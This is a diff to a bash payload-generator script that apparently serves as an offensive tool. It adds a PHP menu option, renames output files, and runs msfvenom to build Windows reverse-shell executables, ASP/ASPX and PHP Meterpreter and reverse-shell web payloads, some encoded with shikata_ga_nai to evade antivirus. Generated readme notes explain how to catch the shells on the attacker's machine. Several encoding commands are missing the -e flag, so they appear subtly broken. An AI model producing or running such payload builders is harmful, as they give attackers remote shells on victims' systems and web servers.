@@ -24,6 +24,7 @@ echo -e "\n${BLUE}╔═════{ 2. Windows:${XX}"
     echo -e "	══{ Powershell           ══{ Meterpreter"
     echo -e "	══{ Creat user account   ══{ http"
     echo -e "	══{ macros               ══{ ASP/ASPX"
+    echo -e "	══{ php"
 echo -e "\n${BLUE}╔═════{ 3. MacOS:${XX}"
     echo -e "	══{ Rev Shell           ══{ Bind Shell"
 echo -e "\n${BLUE}╔═════{ 4. Andriod:${XX}"
@@ -323,6 +324,7 @@ elif [[ $input == "2" ]]; then ## Windows
         echo -e "══{4. http"
         echo -e "══{5. macros"
         echo -e "══{6. ASP/ASPX"
+        echo -e "══{7. PHP"
     read -p "[+] Type?  " ty
     if [[ $ty == "1" ]]; then
         echo -e "\n${BLUE}[+] Powershell:${XX}"
@@ -367,9 +369,9 @@ elif [[ $input == "2" ]]; then ## Windows
         echo -e "\n${BLUE}[+] Creating Non Meterpreter Stageless Payload:${XX}"
         mkdir Payload_List/Non_Meterpreter_Binaries/Stageless 2>/dev/null
             echo -e "[*] The following Reverse Shell will run with netcat listener on the attacker pc or you may use meterpreter with it, just set the payload and other options:" > Payload_List/Non_Meterpreter_Binaries/Stageless/Read_Me.txt
-            echo -e "\n- set payload windows/shell_reverse_tcp for shell.exe" >> Payload_List/Non_Meterpreter_Binaries/Stageless/Read_Me.txt
+            echo -e "\n- set payload windows/shell_reverse_tcp for x86_shell.exe" >> Payload_List/Non_Meterpreter_Binaries/Stageless/Read_Me.txt
             echo -e "\n- set payload windows/x64/shell_reverse_tcp for x64_shell.exe" >> Payload_List/Non_Meterpreter_Binaries/Stageless/Read_Me.txt
-            msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PO -f exe > Payload_List/Non_Meterpreter_Binaries/Stageless/shell.exe
+            msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PO -f exe > Payload_List/Non_Meterpreter_Binaries/Stageless/x86_shell.exe
             msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=$PO -f exe > Payload_List/Non_Meterpreter_Binaries/Stageless/x64_shell.exe
         ### shikata_ga_nai Payloads
             msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PO -f exe -e x86/shikata_ga_nai -i $SH > Payload_List/Non_Meterpreter_Binaries/Stageless/shell_shikata.exe
@@ -409,21 +411,36 @@ elif [[ $input == "2" ]]; then ## Windows
         echo -e "\n${BLUE}[+] Creating ASP/ASPX Payload:${XX}"
         mkdir Payload_List/ASP_ASPX 2>/dev/null
             echo -e "[*] The following binaries run with meterpreter, make sure you set the payload and other options on your meterpreter:" > Payload_List/ASP_ASPX/Read_Me.txt
-            echo -e "\n- set payload windows/meterpreter/reverse_tcp for Rev_TCP.asp" >> Payload_List/ASP_ASPX/Read_Me.txt
-            echo -e "\n- set payload windows/meterpreter/reverse_tcp for Rev_TCP.aspx" >> Payload_List/ASP_ASPX/Read_Me.txt
-            echo -e "\n[*] The following Reverse Shell will run with netcat listener on the attacker pc or you may use meterpreter with it, just set the payload and other options:" > Payload_List/ASP_ASPX/Read_Me.txt
+            echo -e "\n- set payload windows/meterpreter/reverse_tcp for meterpreter.asp" >> Payload_List/ASP_ASPX/Read_Me.txt
+            echo -e "\n- set payload windows/meterpreter/reverse_tcp for meterpreter.aspx" >> Payload_List/ASP_ASPX/Read_Me.txt
+            echo -e "\n[*] The following Reverse Shell will run with netcat listener on the attacker pc or you may use meterpreter with it, just set the payload and other options:" >> Payload_List/ASP_ASPX/Read_Me.txt
             echo -e "\n- set payload windows/shell_reverse_tcp for shell_rev.asp" >> Payload_List/ASP_ASPX/Read_Me.txt
             echo -e "\n- set payload windows/shell_reverse_tcp for shell_rev.aspx" >> Payload_List/ASP_ASPX/Read_Me.txt
-            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f asp > Payload_List/ASP_ASPX/Rev_TCP.asp
-            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f aspx > Payload_List/ASP_ASPX/Rev_TCP.aspx
+            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f asp > Payload_List/ASP_ASPX/meterpreter.asp
+            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f aspx > Payload_List/ASP_ASPX/meterpreter.aspx
             msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PO -f asp > Payload_List/ASP_ASPX/shell_rev.asp
             msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PO -f aspx > Payload_List/ASP_ASPX/shell_rev.aspx
         ### shikata_ga_nai Payloads
-            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f asp x86/shikata_ga_nai -i $SH > Payload_List/ASP_ASPX/Rev_TCP_shikata.asp
-            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f aspx x86/shikata_ga_nai -i $SH > Payload_List/ASP_ASPX/Rev_TCP_shikata.aspx
+            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f asp x86/shikata_ga_nai -i $SH > Payload_List/ASP_ASPX/meterpreter_shikata.asp
+            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f aspx x86/shikata_ga_nai -i $SH > Payload_List/ASP_ASPX/meterpreter_shikata.aspx
             msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PO -f asp x86/shikata_ga_nai -i $SH > Payload_List/ASP_ASPX/shell_rev_shikata.asp
             msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PO -f aspx x86/shikata_ga_nai -i $SH > Payload_List/ASP_ASPX/shell_rev_shikata.aspx
         echo -e "\n${RED}DONE, look into Payload_List/ASP_ASPX${XX}"
+    elif [[ $ty == "7" ]]; then
+        echo -e "\n${BLUE}[+] Creating PHP Payload:${XX}"
+        mkdir Payload_List/PHP 2>/dev/null
+            echo -e "[*] The following binaries run with meterpreter, make sure you set the payload and other options on your meterpreter:" > Payload_List/PHP/Read_Me.txt
+            echo -e "\n- set php/meterpreter_reverse_tcp for meterpreter1.php" >> Payload_List/PHP/Read_Me.txt
+            echo -e "\n- set php/meterpreter/reverse_tcp for meterpreter2.php" >> Payload_List/PHP/Read_Me.txt
+            echo -e "\n[*] The following Reverse Shell will run with netcat listener on the attacker pc or you may use meterpreter with it, just set the payload and other options:" >> Payload_List/PHP/Read_Me.txt
+            echo -e "\n- set php/reverse_php for Rev_TCP.php" >> Payload_List/PHP/Read_Me.txt
+            msfvenom -p php/meterpreter_reverse_tcp LHOST=$IP LPORT=$PO -f raw > Payload_List/PHP/meterpreter1.php
+            msfvenom -p php/meterpreter/reverse_tcp -f raw lhost=$IP lport=$PO > Payload_List/PHP/meterpreter2.php
+            msfvenom -p php/reverse_php LHOST=$IP LPORT=$PO -f raw > Payload_List/PHP/Rev_TCP.php
+        ### shikata_ga_nai Payloads
+            msfvenom -p php/meterpreter_reverse_tcp LHOST=$IP LPORT=$PO -f raw x86/shikata_ga_nai -i $SH > Payload_List/PHP/meterpreter1_shikata.php
+            msfvenom -p php/meterpreter/reverse_tcp lhost=$IP lport=$PO -f raw x86/shikata_ga_nai -i $SH > Payload_List/PHP/meterpreter2_shikata.php
+            msfvenom -p php/reverse_php LHOST=$IP LPORT=$PO -f raw x86/shikata_ga_nai -i $SH > Payload_List/PHP/Rev_TCP_shikata.php
 elif [[ $input == "3" ]]; then ## MacOS
     echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
     echo -e "${RED} \t\t ═════════════════════════════════════════════[ MacOS Payload ]══════════════════════════════════════════ ${XX}"
